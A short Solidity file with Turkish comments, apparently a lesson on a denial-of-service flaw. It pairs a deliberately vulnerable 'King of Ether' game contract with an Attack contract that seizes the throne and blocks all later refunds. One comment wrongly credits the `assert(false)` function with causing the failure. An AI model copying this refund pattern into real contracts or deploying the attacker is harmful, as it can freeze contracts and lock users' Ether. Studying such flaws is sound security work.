// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// KingOfEther kontratı, "Ether Kralı" konseptiyle bir oyunu temsil eder.
// Kullanıcılar daha fazla Ether ödeyerek "kral" olabilir ve önceki kralın Ether'ini geri almasını sağlar.
contract KingOfEther {
    // Şu anki kralın adresini tutan durum değişkeni
    address public king;

    // Kralın tahtta kalabilmesi için gereken minimum Ether miktarını tutan durum değişkeni
    uint256 public balance;

    // Kral olma iddiasında bulunmak için çağrılan fonksiyon
    function claimThrone() external payable {
        // Kullanıcının gönderdiği Ether miktarının mevcut "balance" değerinden büyük olması gerektiğini kontrol eder
        require(msg.value > balance, "Need to pay more to become the king");

        // Mevcut kralın Ether'ini geri göndermek için `call` kullanılır
        (bool sent, ) = king.call{value: balance}("");

        // Ether gönderme işleminin başarısını kontrol eder
        require(sent, "Failed to send Ether");

        // Yeni gönderilen Ether'i `balance` olarak günceller
        balance = msg.value;

        // Yeni kralın adresini `king` olarak kaydeder
        king = msg.sender;
    }
}

// Saldırgan kontrat: KingOfEther kontratına saldırı düzenlemek için tasarlanmıştır.
contract Attack {
    // KingOfEther kontratını referans olarak tutmak için bir durum değişkeni tanımlanır.
    KingOfEther kingOfEther;

    // Saldırgan kontratın constructor'ı, saldırı hedefi olan KingOfEther kontratının adresini alır.
    constructor(KingOfEther _kingOfEther) {
        // KingOfEther kontratını referans değişkenine atar.
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // Ether transferi sırasında hata oluşturmak için tasarlanmış bir fonksiyon.
    function vulnerableFunction() external payable {
        // Ether transferini geri almak için bir hata oluşturur.
        assert(false); // İşlemi geri çeker ve transferi başarısız yapar.
    }

    // Saldırıyı başlatmak için kullanılan fonksiyon.
    function attack() public payable {
        // claimThrone fonksiyonunu çağırarak KingOfEther kontratında "kral" olmaya çalışır.
        kingOfEther.claimThrone{value: msg.value}();
    }
}
